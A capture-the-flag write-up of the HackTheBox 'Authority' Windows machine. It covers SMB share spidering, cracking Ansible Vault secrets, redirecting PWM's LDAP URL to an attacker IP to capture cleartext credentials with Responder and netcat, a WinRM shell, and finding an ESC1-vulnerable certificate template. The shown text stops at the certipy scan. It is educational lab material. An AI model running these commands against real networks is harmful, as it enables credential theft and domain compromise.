---
title: "HTB Authority"
draft: false
categories: ["HTB", "Windows"]
tags:
    - htb-medium
    - SMB
    - nxc
    - ldap
    - PWM
    - ansible-vault
    - AD
    - ADCS
    - active-directory
    - ESC1
    - PassTheCert
date: 2023-12-08T03:33:35+05:30
summary: "Authority is a medium Windows AD box. I discovered Ansible playbooks in a publicly accessible share, containing encrypted variables that, once cracked, provided credentials for the PWM configuration manager. With PWM in config mode, I could make changes without authentication, allowing the capture of clear text LDAP credentials for subsequent WinRM authentication. I also discovered ADCS and a vulnerable certificate template (ESC1). Although I successfully exploited the vulnerability, Kerberos limitations prevented authentication with the generated certificate. To bypass this I used pass-the-cert attack to gain access as Administrator."
---

## Overview

---

> Authority is a medium Windows AD box. I discovered Ansible playbooks in a publicly accessible share, containing encrypted variables that, once cracked, provided credentials for the PWM configuration manager. With PWM in config mode, I could make changes without authentication, allowing the capture of clear text LDAP credentials for subsequent WinRM authentication. I also discovered ADCS and a vulnerable certificate template (ESC1). Although I successfully exploited the vulnerability, Kerberos limitations prevented authentication with the generated certificate. To bypass this I used the "pass-the-cert" attack to gain access as Administrator.

---

## Enumeration

---

### Open Ports

Found a bunch of open ports using nmap

- port 53 → DNS
- port 80 → IIS Web server
- port 88 → Kerberos
- port 135 → MS RPC
- port 139, 445 → SMB
- port 636, 3269 → LDAP over SSL
- port 5985, 47001 → wsman and winrm
- port 8443 → HTTPS

The script scan of LDAP ports leaks the domains `authority.htb` and `authority.htb.corp`. Furthermore, the HTTPS site on port 8443 might be within a Docker container, as its SSL certificate's common name is set to `172.16.2.118`.

```bash
#nmap -p53,88,135,139,80,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49667,49666,49671,49684,49688,49664,49665,49685,49687,49699,49697,49711,58545 -sV -sC -T4 -Pn -oA 10.10.11.222 10.10.11.222

Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-05 02:01 IST
Nmap scan report for 10.10.11.222
Host is up (0.062s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-05 00:31:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-08-05T00:32:07+00:00; +3h59m59s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-08-05T00:32:07+00:00; +3h59m59s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-08-05T00:32:07+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-08-05T00:32:07+00:00; +3h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-08-02T09:54:30
|_Not valid after:  2025-08-03T21:32:54
|_http-title: Site doesnt have a title (text/html;charset=ISO-8859-1).
| fingerprint-strings:
|   FourOhFourRequest, GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Sat, 05 Aug 2023 00:31:14 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Sat, 05 Aug 2023 00:31:14 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Sat, 05 Aug 2023 00:31:20 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
58545/tcp open  msrpc         Microsoft Windows RPC
```

### port 53 - DNS

DNS resolution maps both domains from nmap. However, since zone transfer failed, no other significant information from DNS

```bash
❯ dig +noall +answer authority.htb @10.129.216.215
authority.htb.          600     IN      A       10.129.216.215
authority.htb.          600     IN      A       10.129.229.30
authority.htb.          600     IN      A       10.129.229.56
❯ dig +noall +answer authority.htb.corp @10.129.216.215
authority.htb.corp.     1200    IN      A       10.129.216.215

❯ dig axfr @10.10.11.222 authority.htb

; <<>> DiG 9.18.16-1-Debian <<>> axfr @10.10.11.222 authority.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

### port 445 - SMB

SMB has anonymous login enabled, with which I have read access to the `Development` share.

```bash
❯ nxc smb 10.10.11.222 -u  'guest' -p ''
SMB         10.10.11.222   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222   445    AUTHORITY        [+] authority.htb\guest:

❯ nxc smb 10.10.11.222 -u  'guest' -p '' --shares
SMB         10.10.11.222   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222   445    AUTHORITY        [+] authority.htb\guest:
SMB         10.10.11.222   445    AUTHORITY        [*] Enumerated shares
SMB         10.10.11.222   445    AUTHORITY        Share           Permissions     Remark
SMB         10.10.11.222   445    AUTHORITY        -----           -----------     ------
SMB         10.10.11.222   445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.10.11.222   445    AUTHORITY        C$                              Default share
SMB         10.10.11.222   445    AUTHORITY        Department Shares
SMB         10.10.11.222   445    AUTHORITY        Development     READ
SMB         10.10.11.222   445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.10.11.222   445    AUTHORITY        NETLOGON                        Logon server share
SMB         10.10.11.222   445    AUTHORITY        SYSVOL                          Logon server share
```

With NetExec's SMB spider plus module, I was able to spider the readable shares and download relevant files.

```bash
❯ nxc smb 10.10.11.222 -u  'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true
SMB         10.10.11.222   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222   445    AUTHORITY        [+] authority.htb\guest:
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*] Started module spidering_plus with the following options:
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*]  DOWNLOAD_FLAG: True
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*]     STATS_FLAG: True
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*]  MAX_FILE_SIZE: 50 KB
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*]  OUTPUT_FOLDER: /tmp/nxc_spider_plus
SPIDER_P... 10.10.11.222   445    AUTHORITY        [+] Saved share-file metadata to "/tmp/nxc_spider_plus/10.10.11.222.json".
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*] SMB Shares:           7 (ADMIN$, C$, Department Shares, Development, IPC$, NETLOGON, SYSVOL)
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*] SMB Readable Shares:  2 (Development, IPC$)
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*] SMB Filtered Shares:  1
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*] Total folders found:  27
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*] Total files found:    52
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*] File size average:    1.5 KB
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*] File size min:        4 B
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*] File size max:        11.1 KB
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*] File unique exts:     6 (.txt, .md, .yml, .j2, .cfg, .ini)
SPIDER_P... 10.10.11.222   445    AUTHORITY        [*] Downloads successful: 52
SPIDER_P... 10.10.11.222   445    AUTHORITY        [+] All files processed successfully.
```

Going through the findings, I discovered what looks like ansible playbooks in the `Development\Automation\Ansible` subdirectory.

```bash
❯ l /tmp/nxc_spider_plus/10.10.11.222/Development/Automation/Ansible
Permissions Size User    Date Modified Name
drwxr-xr-x     - abraxas 30 Nov 18:07  ADCS
drwxr-xr-x     - abraxas 30 Nov 18:07  LDAP
drwxr-xr-x     - abraxas 30 Nov 18:07  PWM
drwxr-xr-x     - abraxas 30 Nov 18:07  SHARE

❯ cat /tmp/nxc_spider_plus/10.10.11.222.json | \
jq -r '.Development | keys_unsorted[]' | \
awk -F '/' '{sub($1 FS $2 FS, ""); print}'

ADCS/.ansible-lint
ADCS/.yamllint
...snip...
ADCS/tasks/assert.yml
ADCS/tasks/generate_ca_certs.yml
ADCS/tasks/init_ca.yml
ADCS/tasks/main.yml
ADCS/tasks/requests.yml
...snip...
LDAP/handlers/main.yml
LDAP/meta/main.yml
LDAP/tasks/main.yml
...snip...
PWM/README.md
PWM/ansible.cfg
PWM/ansible_inventory
PWM/defaults/main.yml
PWM/handlers/main.yml
PWM/meta/main.yml
PWM/tasks/main.yml
PWM/templates/context.xml.j2
PWM/templates/tomcat-users.xml.j2
SHARE/tasks/main.yml
```

In the `PWM` subdirectory, I came across intriguing files, including inventory, configuration, variables, and ansible tasks.

```bash
├── PWM
│   ├── ansible.cfg
│   ├── ansible_inventory
│   ├── defaults
│   │   └── main.yml
│   ├── handlers
│   │   └── main.yml
│   ├── meta
│   │   └── main.yml
│   ├── README.md
│   ├── tasks
│   │   └── main.yml
│   └── templates
│       ├── context.xml.j2
│       └── tomcat-users.xml.j2
└── SHARE
    └── tasks
        └── main.yml
```

I found WinRM credentials in the inventory file. Unfortunately, the creds don't work.

```bash
❯ cat PWM/ansible_inventory
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore

❯ nxc winrm 10.10.11.222 -u 'administrator' -p 'Welcome1'
WINRM       10.10.11.222   5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.10.11.222   5985   AUTHORITY        [-] authority.htb\administrator:Welcome1
```

Within the `defaults/main.yml` file, I found a few variables encrypted using ansible-vault. These encrypted variables, particularly within the default directory, could be interesting.

_defaults/main.yml_

```yml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

I can crack the encrypted variables by generating a hash with the `ansible2john` script and then crack it using JohnTheRipper.

> The script requires that the hash start with `$ANSIBLE_VAULT`. So I saved one of the variables in a `variable.yml` file

```bash
❯ ansible2john variable.yml
admin_login.yml:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8

❯ ansible2john variable.yml > vault_hash
```

Cracking the generated hash using JTR, gives the decryption password for the vault, `!@#$%^&*`.

```bash
❯ john_rock vault_hash
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 AVX 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (variable.yml)
1g 0:00:00:28 DONE (2023-08-05 02:30) 0.03567g/s 1420p/s 1420c/s 1420C/s 001983..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

With the password the variables can be decrypted the variables using `ansible-vault decrypt` command.

- pwm_admin_login → `svc_pwm`
- pwm_admin_password → `pWm_@dm!N_!23`
- ldap_admin_password → `DevT3st@123`

```bash
❯ ansible-vault decrypt pwm_login.yml
Vault password:
Decryption successful
❯ cat pwm_login.yml
svc_pwm

❯ ansible-vault decrypt pwm_password.yml
Vault password:
Decryption successful
❯ cat pwm_password.yml
pWm_@dm!N_!23

❯ ansible-vault decrypt ldap_password.yml
Vault password:
Decryption successful
❯ cat ldap_password.yml
DevT3st@123
```

### port 8443 - HTTPS

Based on the headers, it appears the site is loading the contents of the `/pwm` directory.

```bash
❯ https --verify false authority.htb:8443
HTTP/1.1 200
Connection: keep-alive
Content-Length: 82
Content-Type: text/html;charset=ISO-8859-1
Date: Sat, 05 Aug 2023 21:24:16 GMT
Keep-Alive: timeout=60

<html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
```

The index page pops up a notice stating that PWM is in configuration mode, allowing me to make updates to the config w/o LDAP authentication.

![PWM-config-mode-notice](./images/PWM-config-mode-notice.png "PWM Notice")

Attempting to authenticate using the admin credentials for PWM, decrypted from the ansible-vault, results in a "5017 Directory unavailable" error.

![PWM-login-error](./images/PWM-login-error.png "PWN Login error")

---

## Initial Foothold

---

### Capturing LDAP credentials

The login page also links to a configuration manager at `private/config/login`. This is intriguing, considering the notice earlier regarding configuration modifications.

![PWM-configuration-manager](./images/PWM-configuration-manager.png "Configuration Manager Login")

Luckily, the pwm_admin_password credential from the ansible vault works here. Post login I can see the absolute path to the configuration file. It also has an option to import and export the configurations. When attempting to download the config a warning is shown stating the file contains sensitive credentials.

Fortunately, the `pwm_admin_password` obtained from the Ansible vault works here. Post login, I can see the absolute path to the configuration file, along with an option to "Import" and "Export" configurations

![PWM-config-manager-post-login](./images/PWM-config-manager-post-login.png " Configuration Manager")

<!-- ![PWM-config-summary](./images/PWM-config-summary.png) -->

The downloaded configuration file reveals

- LDAP proxy username: `svc_ldap`.
- LDAP proxy password, although it appears to be encrypted.
- LDAP server URL: `ldaps://authority.authority.htb:636`.

```xml
...snip...
<setting key="ldap.proxy.username" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="STRING" syntaxVersion="0">
    <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy User</label>
    <value>CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb</value>
</setting>
...snip...
<setting key="ldap.proxy.password" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="PASSWORD" syntaxVersion="0">
    <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy Password</label>
    <value>ENC-PW:SWHyEvLQo/B2gjYvXoL2OtcBIwVhfTW9spltsPbJeH/gQhfS+3/aIhmt29qR/LzkTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=</value>
</setting>
...snip...
<setting key="ldap.serverUrls" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="STRING_ARRAY" syntaxVersion="0">
    <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs</label>
    <value>ldaps://authority.authority.htb:636</value>
</setting>
...snip...
```

With the ability to import configurations on the website, altering the LDAP server URL to my own (hosted using responder) might allow me to capture LDAP credentials when other services attempt to authenticate to LDAP.

I modified the LDAP server URL to `ldap://<tun0>:IP`, redirecting it to my attack box.

```xml
...snip...
<setting key="ldap.serverUrls" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="STRING_ARRAY" syntaxVersion="0">
    <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs</label>
    <value>ldap://10.10.14.132:389</value>
</setting>
...snip...
````

When I update the configuration and run Responder on my attack box, it successfully captures the cleartext LDAP credentials.

```bash
❯ _ responder -I tun0 -v
...snip...
    LDAP server                [ON]
...snip...
[+] Listening for events...

[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.10.11.222
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

This works even when starting a netcat listener on port 389 (ldap)

```bash
❯ nc -nlvp 389
listening on [any] 389 ...
connect to [10.10.14.132] from (UNKNOWN) [10.10.11.222] 59434
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!
```

### Shell as svc_ldap

With these new credentials, I have read access to the `Department Shares` share. However, the shares only has empty directories in it.
Using the newly acquired credentials, I have read access to the `Department Shares` share. However, after spidering, it seems the share only contains empty directories.

```bash
❯ nxc smb  10.10.11.222 -u  'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
SMB          10.10.11.222   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB          10.10.11.222   445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
❯ nxc smb  10.10.11.222 -u  'svc_ldap' -p 'lDaP_1n_th3_cle4r!' --shares
SMB          10.10.11.222   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB          10.10.11.222   445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
SMB          10.10.11.222   445    AUTHORITY        [*] Enumerated shares
SMB          10.10.11.222   445    AUTHORITY        Share           Permissions     Remark
SMB          10.10.11.222   445    AUTHORITY        -----           -----------     ------
SMB          10.10.11.222   445    AUTHORITY        ADMIN$                          Remote Admin
SMB          10.10.11.222   445    AUTHORITY        C$                              Default share
SMB          10.10.11.222   445    AUTHORITY        Department Shares READ
SMB          10.10.11.222   445    AUTHORITY        Development     READ
SMB          10.10.11.222   445    AUTHORITY        IPC$            READ            Remote IPC
SMB          10.10.11.222   445    AUTHORITY        NETLOGON        READ            Logon server share
SMB          10.10.11.222   445    AUTHORITY        SYSVOL          READ            Logon server share

❯ nxc smb  10.10.11.222 -u  'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M spider_plus -o DOWNLOAD_FLAG=true
SMB          10.10.11.222   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB          10.10.11.222   445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
SPIDER_P...  10.10.11.222   445    AUTHORITY        [*] Started module spidering_plus with the following options:
SPIDER_P...  10.10.11.222   445    AUTHORITY        [*]  DOWNLOAD_FLAG: True
...snip...
...snip...
SPIDER_P...  10.10.11.222   445    AUTHORITY        [+] All files processed successfully.

❯ /bin/cat /tmp/nxc_spider_plus/ 10.10.11.222.json | jq -r '."Department Shares"'
{}
```

The obtained credentials also provide access over WinRM. I successfully logged in as `svc_ldap` using evil-winrm.

```bash
❯ nxc winrm  10.10.11.222 -u  'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
WINRM        10.10.11.222   5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM        10.10.11.222   5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)

❯ evil-winrm -i 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami
htb\svc_ldap
*Evil-WinRM* PS C:\Users\svc_ldap\Documents>
```

---

## Enumerating Active Directory

---

In the `C:\` directory, there's a "Certs" directory containing a certificate named `LDAPs.pfx`.

```cmd
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/23/2023   6:16 PM                Certs
d-----        3/28/2023   1:59 PM                Department Shares
d-----        3/17/2023   9:20 AM                Development
d-----         8/9/2022   7:00 PM                inetpub
d-----        3/24/2023   8:22 PM                PerfLogs
d-r---        3/25/2023   1:20 AM                Program Files
d-----        3/25/2023   1:19 AM                Program Files (x86)
d-----         8/5/2023   7:23 PM                pwm
d-r---        3/24/2023  11:27 PM                Users
d-----        7/12/2023   1:19 PM                Windows
-a----        8/10/2022   8:44 PM       84784749 pwm-onejar-2.0.3.jar

*Evil-WinRM* PS C:\> ls "C:/Certs/"


    Directory: C:\Certs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/23/2023   6:11 PM           4933 LDAPs.pfx
```

The certificate is password protected. Nevertheless, its presence alone suggests the existence of Active Directory Certificate Services (AD CS).

```bash
❯ certipy cert -pfx LDAPs.pfx
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[-] Got error: Invalid password or PKCS12 data
[-] Use -debug to print a stacktrace
```

A Certutil dump confirms the presence of a certificate authority named `AUTHORITY-CA` in the environment.

```bash
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> certutil -dump
Entry 0: (Local)
  Name:                         "AUTHORITY-CA"
  Organizational Unit:          ""
  Organization:                 ""
  Locality:                     ""
  State:                        ""
  Country/region:               ""
  Config:                       "authority.authority.htb\AUTHORITY-CA"
  Exchange Certificate:         ""
  Signature Certificate:        "authority.authority.htb_AUTHORITY-CA.crt"
  Description:                  ""
  Server:                       "authority.authority.htb"
  Authority:                    "AUTHORITY-CA"
  Sanitized Name:               "AUTHORITY-CA"
  Short Name:                   "AUTHORITY-CA"
  Sanitized Short Name:         "AUTHORITY-CA"
  Flags:                        "13"
  Web Enrollment Servers:       ""
CertUtil: -dump command completed successfully
```

### Enum with adPEAS

Executed the `adPEAS.ps1` script to perform additional enumeration in the AD environment.

```powershell
Import-Module .\adPEAS.ps1
Invoke-adPEAS -Domain 'authority.htb' -Outputfile adPEAS_outputfile -NoColor
```

All members of the `Authenticated Users` group possess permissions to add computers to the `authority.htb` domain.

```bash
[?] +++++ Checking Add-Computer Permissions +++++
[+] Filtering found identities that can add a computer object to domain 'authority.htb':
[!] Every member of group 'Authenticated Users' can add a computer to domain 'authority.htb'

distinguishedName:          CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=authority,DC=htb
objectSid:              S-1-5-11
memberOf:               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=authority,DC=htb
                    CN=Certificate Service DCOM Access,CN=Builtin,DC=authority,DC=htb
                    CN=Users,CN=Builtin,DC=authority,DC=htb
```

Looking at vulnerabilities in AD CS, it appears that the `CorpVPN` template is susceptible to the `ECS1` vulnerability.

```bash
[?] +++++ Checking Template 'CorpVPN' +++++
[!] Template 'CorpVPN' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
[+] Identity 'HTB\Domain Computers' has enrollment rights for template 'CorpVPN'
Template Name:              CorpVPN
Template distinguishedname:     CN=CorpVPN,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb
Date of Creation:           03/24/2023 23:48:09
[+] Extended Key Usage:         Encrypting File System, Secure E-mail, Client Authentication, Document Signing, 1.3.6.1.5.5.8.2.2, IP Security User, KDC Authentication
EnrollmentFlag:             INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
[!] CertificateNameFlag:        ENROLLEE_SUPPLIES_SUBJECT
[+] Enrollment allowed for:     HTB\Domain Computers
```

---

## Privilege Escalation

---

### AD CS Certificate abuse

```bash
❯ certipy find -vulnerable -stdout -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.216.215
Certipy v4.8.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
